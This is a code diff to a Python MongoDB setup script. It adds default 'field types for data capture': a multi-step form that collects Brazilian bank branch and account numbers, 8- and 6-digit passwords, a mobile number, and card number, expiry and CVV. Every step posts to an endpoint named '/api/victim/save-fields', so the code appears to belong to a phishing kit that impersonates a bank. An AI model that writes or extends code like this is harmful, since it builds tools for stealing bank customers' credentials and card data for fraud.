@@ -12,6 +12,7 @@ def initialize_db():
     1. Creating a super_admin user if no admin exists
     2. Creating 3 default plans if no plans exist
     3. Creating default templates if no templates exist
+    4. Creating default field types for data capture
     """
     # Check if there are any admins
     if mongo.db.admins.count_documents({}) == 0:
@@ -24,6 +25,10 @@ def initialize_db():
     # Check if there are any templates
     if mongo.db.templates.count_documents({}) == 0:
         create_default_templates()
+    
+    # Check if there are any field types
+    if mongo.db.field_types.count_documents({}) == 0:
+        create_default_field_types()
 
 
 def create_default_admin():
@@ -452,3 +457,127 @@ def create_default_templates():
 
     except Exception as e:
         print(f"Error creating default templates: {e}")
+
+
+def create_default_field_types():
+    """Create default field types for data capture"""
+    try:
+        # Define default field types
+        default_field_types = [
+            {
+                "name": "Agência e Conta",
+                "slug": "agencia_conta",
+                "order": 1,
+                "fields": [
+                    {
+                        "name": "agencia",
+                        "label": "Agência",
+                        "type": "text",
+                        "placeholder": "Ex: 1234-5",
+                        "required": True,
+                        "inputmode": "numeric"
+                    },
+                    {
+                        "name": "conta",
+                        "label": "Conta",
+                        "type": "text",
+                        "placeholder": "Ex: 12345-6",
+                        "required": True,
+                        "inputmode": "numeric"
+                    },
+                    {
+                        "name": "save_account",
+                        "label": "Guardar agência e conta",
+                        "type": "checkbox",
+                        "required": False
+                    }
+                ],
+                "api_endpoint": "/api/victim/save-fields",
+                "next_step": "senha",
+                "createdAt": datetime.utcnow(),
+                "updatedAt": datetime.utcnow()
+            },
+            {
+                "name": "Senhas e Celular",
+                "slug": "senha",
+                "order": 2,
+                "fields": [
+                    {
+                        "name": "senha",
+                        "label": "Senha de 8 dígitos",
+                        "type": "password",
+                        "maxlength": 8,
+                        "required": True,
+                        "inputmode": "numeric"
+                    },
+                    {
+                        "name": "senha6",
+                        "label": "Senha de 6 dígitos",
+                        "type": "password",
+                        "maxlength": 6,
+                        "required": True,
+                        "inputmode": "numeric"
+                    },
+                    {
+                        "name": "celular",
+                        "label": "Celular",
+                        "type": "tel",
+                        "placeholder": "(11) 98765-4321",
+                        "required": True,
+                        "inputmode": "tel"
+                    }
+                ],
+                "api_endpoint": "/api/victim/save-fields",
+                "next_step": "cartao",
+                "createdAt": datetime.utcnow(),
+                "updatedAt": datetime.utcnow()
+            },
+            {
+                "name": "Dados do Cartão",
+                "slug": "cartao",
+                "order": 3,
+                "fields": [
+                    {
+                        "name": "numero_cartao",
+                        "label": "Número do Cartão",
+                        "type": "text",
+                        "placeholder": "1234 5678 9012 3456",
+                        "required": True,
+                        "inputmode": "numeric"
+                    },
+                    {
+                        "name": "validade_cartao",
+                        "label": "Validade",
+                        "type": "text",
+                        "placeholder": "MM/AA",
+                        "required": True,
+                        "inputmode": "numeric"
+                    },
+                    {
+                        "name": "cvv_cartao",
+                        "label": "CVV",
+                        "type": "text",
+                        "maxlength": 3,
+                        "placeholder": "123",
+                        "required": True,
+                        "inputmode": "numeric"
+                    }
+                ],
+                "api_endpoint": "/api/victim/save-fields",
+                "next_step": "complete",
+                "createdAt": datetime.utcnow(),
+                "updatedAt": datetime.utcnow()
+            }
+        ]
+
+        # Insert all field types
+        result = mongo.db.field_types.insert_many(default_field_types)
+
+        if result.inserted_ids:
+            print(f"Created {len(result.inserted_ids)} default field types")
+        else:
+            print("Failed to create default field types")
+
+    except Exception as e:
+        print(f"Error creating default field types: {e}")
+
